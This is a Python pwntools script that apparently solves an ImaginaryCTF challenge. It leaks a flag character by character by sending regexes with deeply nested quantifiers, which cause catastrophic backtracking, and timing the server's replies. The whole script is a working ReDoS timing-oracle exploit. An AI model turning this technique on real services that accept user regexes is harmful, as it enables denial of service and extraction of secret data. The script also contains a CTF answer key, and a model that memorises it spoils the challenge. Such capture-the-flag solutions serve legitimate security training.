#!/usr/bin/env python3

from pwn import *
from re import escape, fullmatch
from time import time

reqs = 0

def get_new_process():
    # p = process(["python3", "server.py"])
    p = remote('puzzler7.imaginaryctf.org', 7006)
    p.recvuntil('='*80)
    p.recvuntil('='*80)
    return p

def time_req(p, rx):
    global reqs
    reqs += 1
    p.recvuntil("regex: ")
    start = time()
    p.sendline(rx)
    return not p.can_recv(.5)

def get_nested(n):
    seed = '(.*)'
    for i in range(n):
        seed = '(' + seed + '*)'
    return seed

flag = "ictf{"
p = get_new_process()
while True:
    added = 0
    for c in range(32, 127):
        rx = ''.join(f"\\{'{:03o}'.format(ord(cr))}" for cr in flag)
        rx += f"\\{'{:03o}'.format(c)}"
        rx += get_nested(40) + '~'
        if time_req(p, rx):
            added = 1
            p = get_new_process()
            flag += chr(c)
            break
    print(flag)
    if not added:
        flag += '}'
        break

print(flag)
print("Solved in", reqs, "requests")
